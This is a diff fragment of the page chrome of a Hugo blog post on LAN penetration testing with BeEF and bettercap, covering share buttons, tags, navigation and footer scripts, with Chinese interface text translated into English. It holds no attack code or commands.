fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on VK" data-sharer="vk" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools" data-caption="Using bettercap to bind Beef hooks for browser hijacking, and using Beef-hijacked browsers to execute payloads." data-image="/img/2021-02-02_13-51.png"><i class="fab fa-vk fa-fw"></i></a><a href="javascript:void(0);" title="Share on Buffer" data-sharer="buffer" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools" data-via="weepingdogel_me" data-picture="/img/2021-02-02_13-51.png"><i class="fab fa-buffer fa-fw"></i></a><a href="javascript:void(0);" title="Share on Xing" data-sharer="xing" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools"><i class="fab fa-xing fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="Share on Instapaper" data-sharer="instapaper" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools" data-description="Using bettercap to bind Beef hooks for browser hijacking, and using Beef-hijacked browsers to execute payloads."><i data-svg-src="/lib/simple-icons/icons/instapaper.min.svg"></i></a><a href="javascript:void(0);" title="Share on Pocket" data-sharer="pocket" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fab fa-get-pocket fa-fw"></i></a><a href="javascript:void(0);" title="Share on Digg" data-sharer="digg" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fab fa-digg fa-fw"></i></a><a href="javascript:void(0);" title="Share on StumbleUpon" data-sharer="stumbleupon" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools"><i class="fab fa-stumbleupon fa-fw"></i></a><a href="javascript:void(0);" title="Share on Flipboard" data-sharer="flipboard" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools"><i class="fab fa-flipboard fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools" data-image="/img/2021-02-02_13-51.png"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="Share on 人人" data-sharer="renren" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fab fa-renren fa-fw"></i></a><a href="javascript:void(0);" title="Share on Myspace" data-sharer="myspace" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools" data-description="Using bettercap to bind Beef hooks for browser hijacking, and using Beef-hijacked browsers to execute payloads."><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools" data-description="Using bettercap to bind Beef hooks for browser hijacking, and using Beef-hijacked browsers to execute payloads."><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="Share on 百度" data-sharer="baidu" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools"><i data-svg-src="/lib/simple-icons/icons/baidu.min.svg"></i></a><a href="javascript:void(0);" title="Share on OK.RU" data-sharer="okru" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools"><i class="fab fa-odnoklassniki fa-fw"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="Share on Skype" data-sharer="skype" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools"><i class="fab fa-skype fa-fw"></i></a><a href="javascript:void(0);" title="Share on Trello" data-sharer="trello" data-url="http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-title="LAN Penetration Testing with Beef, Bettercap, and Other Tools" data-description="Using bettercap to bind Beef hooks for browser hijacking, and using Beef-hijacked browsers to execute payloads."><i class="fab fa-trello fa-fw"></i></a><a href="//mix.com/add?url=http%3a%2f%2fweepingdogel.github.io%2fposts%2fbeef%25E9%2585%258D%25E5%2590%2588bettercap%25E4%25BB%25A5%25E5%258F%258Amsf%25E7%25AD%2589%25E5%25A4%259A%25E7%25A7%258D%25E5%25B7%25A5%25E5%2585%25B7%25E7%259A%2584%25E5%25B1%2580%25E5%259F%259F%25E7%25BD%2591%25E6%25B8%2597%25E9%2580%258F%25E6%25B5%258B%25E8%25AF%2595%2f&amp;description=LAN%20Penetration%20Testing%20with%20Beef%2c%20Bettercap%2c%20and%20Other%20Tools" target="_blank" title="Share on Mix"><i class="fab fa-mix fa-fw"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/beef/">beef</a>,&nbsp;<a href="/tags/bettercap/">bettercap</a>,&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/metasploit/">metasploit</a>,&nbsp;<a href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a>,&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>,&nbsp;<a href="/tags/arp-%E6%AC%BA%E9%AA%97/">ARP 欺骗</a>,&nbsp;<a href="/tags/%E9%BB%91%E5%AE%A2/">黑客</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/beef/">beef</a>,&nbsp;<a href="/tags/bettercap/">bettercap</a>,&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/metasploit/">metasploit</a>,&nbsp;<a href="/tags/notes/">Notes</a>,&nbsp;<a href="/tags/penetration-testing/">Penetration testing</a>,&nbsp;<a href="/tags/arp-spoofing/">ARP spoofing</a>,&nbsp;<a href="/tags/hackers/">Hackers</a></section>
         <section>
-            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3_gvfs_%E5%9C%A8_i3wm_%E4%B8%8B%E6%97%A0%E6%B3%95%E6%8C%82%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/" class="prev" rel="prev" title="如何解决 gvfs 在 i3wm 下无法挂载的问题"><i class="fas fa-angle-left fa-fw"></i>如何解决 gvfs 在 i3wm 下无法挂载的问题</a>
-            <a href="/posts/%E5%AD%A6gtk%E8%AE%B0/" class="next" rel="next" title="学 GTK 记">学 GTK 记<i class="fas fa-angle-right fa-fw"></i></a></div>
+    <div class="post-nav"><a href="/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/" class="prev" rel="prev" title="Help with College Computer Homework"><i class="fas fa-angle-left fa-fw"></i>Help with College Computer Homework</a>
+            <a href="/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/" class="next" rel="next" title="Python Learning Notes - ArgParse">Python Learning Notes - ArgParse<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 <div id="comments"><div id="utterances"></div><noscript>
                 Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
             </noscript></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.112.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
                 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://weepingdogel.github.io" target="_blank">WeepingDogel</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
-        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                 <i class="fas fa-arrow-up fa-fw"></i>
-            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                 <i class="fas fa-comment fa-fw"></i>
             </a>
-        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"title","label":"gitalk","lightTheme":"github-light","repo":"WeepingDogel/WeepingDogel.github.io"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"twemoji":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"title","label":"gitalk","lightTheme":"github-light","repo":"WeepingDogel/WeepingDogel.github.io"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"twemoji":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
